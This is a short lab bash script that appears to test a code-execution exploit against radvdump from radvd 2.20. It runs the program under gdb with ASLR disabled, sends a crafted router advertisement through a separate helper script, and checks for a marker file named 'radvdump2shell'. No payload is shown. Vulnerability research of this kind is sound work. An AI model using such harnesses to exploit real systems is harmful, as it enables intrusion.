#!/bin/bash
# Lab-only: one live radvdump + one crafted RA, ASLR disabled by gdb.
# Usage: run_marker.sh <marker|marker-safe> <output-file>
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
MODE="${1:?mode}"
OUT="${2:?output}"
MARKER=/tmp/radvdump2shell-marker
cd "$HERE"
sudo -n rm -f "$MARKER" "$OUT"
(
  sleep 3
  sudo -n python3 "$HERE/send_marker.py" "$MODE"
) &
SLEEPER=$!
timeout 25 sudo -n setarch -R gdb -q -batch -x marker.gdb \
  --args "$HERE/radvd-2.20-plain/radvdump" -d 4 > "$OUT" 2>&1
RC=$?
kill "$SLEEPER" 2>/dev/null || true
wait "$SLEEPER" 2>/dev/null || true
if [ -f "$MARKER" ]; then
  echo "MARKER_PRESENT $MARKER (gdb_rc=$RC)"
else
  echo "MARKER_ABSENT (gdb_rc=$RC)"
fi
